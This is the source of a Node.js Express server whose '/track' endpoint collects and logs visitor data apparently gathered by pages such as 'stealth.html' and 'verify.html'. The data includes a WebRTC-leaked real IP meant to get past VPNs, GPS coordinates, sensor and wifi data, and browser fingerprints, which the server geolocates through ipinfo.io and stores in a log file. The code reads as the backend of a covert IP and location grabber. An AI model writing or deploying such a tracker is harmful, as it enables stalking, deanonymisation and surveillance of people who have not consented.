const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 6677;

// TOP LEVEL LOGGER - MUST BE FIRST
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] INCOMING REQUEST: ${req.method} ${req.url}`);
  console.log('Headers:', JSON.stringify(req.headers));
  next();
});

console.log('Current Directory:', __dirname);
console.log('Public Directory:', path.join(__dirname, 'public'));

// ... (keep middle same)



// Trust proxy for ngrok
app.set('trust proxy', true);

// CORS middleware to allow requests from ngrok
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  console.log('Root URL hit at', new Date().toISOString());
  res.send('Server is running!');
});

app.get('/test.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'test.html'));
});

app.get('/verify.html', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'verify.html');
  console.log('Attempting to serve:', filePath);
  if (fs.existsSync(filePath)) {
    console.log('File exists!');
    res.sendFile(filePath);
  } else {
    console.error('FILE NOT FOUND ON DISK:', filePath);
    res.status(404).send('File not found on server disk');
  }
});

app.get('/final.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'final.html'));
});

app.get('/video.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'video.html'));
});

app.get('/stealth.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'stealth.html'));
});

app.use((req, res, next) => {
  console.log('UNHANDLED REQUEST:', req.method, req.url);
  next();
});

app.post('/track', async (req, res) => {
  console.log('!!! HIT RECEIVED !!!', new Date().toISOString());
  console.log('Headers:', JSON.stringify(req.headers));
  console.log('Body:', JSON.stringify(req.body));

  try {
    const data = req.body;
    console.log('Request body received:', JSON.stringify(data).substring(0, 200) + '...');

    // Get client IP from request headers (fallback if WebRTC doesn't work)
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.headers['x-real-ip'] ||
      req.connection?.remoteAddress ||
      req.socket?.remoteAddress ||
      (req.ip && !req.ip.startsWith('::') ? req.ip : null) ||
      'unknown';

    // Clean up IPv6 localhost formats
    const cleanClientIP = clientIP.replace('::ffff:', '').replace('::1', '');

    // Try WebRTC IP first, then fallback to client IP from request
    let ip = data.location?.realIP || data.location?.ip;

    // If no WebRTC IP or it's invalid, use client IP
    if (!ip || ip === 'undefined' || ip === 'null' || ip.startsWith('::') || ip === '127.0.0.1') {
      // Try to get real IP from external service if client IP is localhost
      if (cleanClientIP === 'unknown' || cleanClientIP === '127.0.0.1' || cleanClientIP.startsWith('::')) {
        try {
          // Get public IP from external service
          const publicIPRes = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
          ip = publicIPRes.data.ip;
          console.log('Fetched public IP from service:', ip);
        } catch (e) {
          console.log('Could not fetch public IP, using client IP:', cleanClientIP);
          ip = cleanClientIP;
        }
      } else {
        ip = cleanClientIP;
      }
    }

    console.log('Using IP for geolocation:', ip);
    console.log('WebRTC IP from client:', data.location?.realIP);
    console.log('Client IP from request:', cleanClientIP);

    // Get geolocation
    let geoData = { error: 'Could not fetch geolocation', ip: ip };

    if (ip && ip !== 'unknown' && !ip.startsWith('::') && ip !== '127.0.0.1') {
      try {
        const geoRes = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
        geoData = geoRes.data;
        console.log('Geolocation fetched successfully');
      } catch (geoError) {
        console.error('Geolocation API error:', geoError.message);
        geoData = { error: geoError.message, ip: ip, attemptedIP: ip };
      }
    }

    // Log the data to a file with timestamp
    const timestamp = new Date().toISOString();
    const logEntry = `TRACKING HIT - ${timestamp}\n`;
    const logEntry2 = `IP USED: ${ip}\n`;
    const logEntry3 = `DEVICE: ${JSON.stringify(data.device)}\n`;
    const logEntry4 = `OS: ${JSON.stringify(data.os)}\n`;
    const logEntry5 = `BROWSER: ${JSON.stringify(data.browser)}\n`;
    const logEntry6 = `LOCATION: ${JSON.stringify(geoData)}\n`;
    const logEntry7 = `GPS: ${JSON.stringify({ lat: data.location?.lat, lng: data.location?.lng, accuracy: data.location?.accuracy, error: data.location?.geoError })}\n`;
    const logEntry8 = `CLIENT DATA: ${JSON.stringify({ url: data.url, referrer: data.referrer, viewport: data.viewport })}\n`;
    const logEntry9 = `SENSORS: ${JSON.stringify(data.sensors)}\n`;
    const logEntry10 = `WIFI: ${JSON.stringify(data.wifi)}\n`;
    const logEntry11 = `FINGERPRINT: ${JSON.stringify(data.fingerprint)}\n`;
    const logEntry12 = `-----------------------------\n`;

    const logContent = logEntry + logEntry2 + logEntry3 + logEntry4 + logEntry5 + logEntry6 + logEntry7 + logEntry8 + logEntry9 + logEntry10 + logEntry11 + logEntry12;

    // Append to log file - use synchronous version to ensure it completes
    try {
      fs.appendFileSync('logs.txt', logContent);
      console.log('Log saved successfully to logs.txt');

      // CRITICAL FOR RENDER: Print the formatted log to stdout so it shows in the dashboard
      console.log('\n' + logContent + '\n');
    } catch (fileError) {
      console.error('Error writing to log file:', fileError);
      // Try async as fallback
      fs.appendFile('logs.txt', logContent, (err) => {
        if (err) {
          console.error('Async log write also failed:', err);
        }
      });
    }

    res.status(200).send('Data received');
    console.log('Response sent successfully');
  } catch (error) {
    console.error('Error processing track request:', error);
    console.error('Error stack:', error.stack);
    res.status(500).send('Internal server error');
  }
});

app.listen(port, () => {
  console.log(`Server executing on port ${port} (PID: ${process.pid})`);
  const startupMsg = `SERVER RESTARTED AT ${new Date().toISOString()}\n`;
  try {
    fs.appendFileSync('logs.txt', startupMsg);
    console.log('Successfully wrote startup message to logs.txt');
  } catch (e) {
    console.error('FAILED TO WRITE TO LOGS.TXT:', e);
  }
});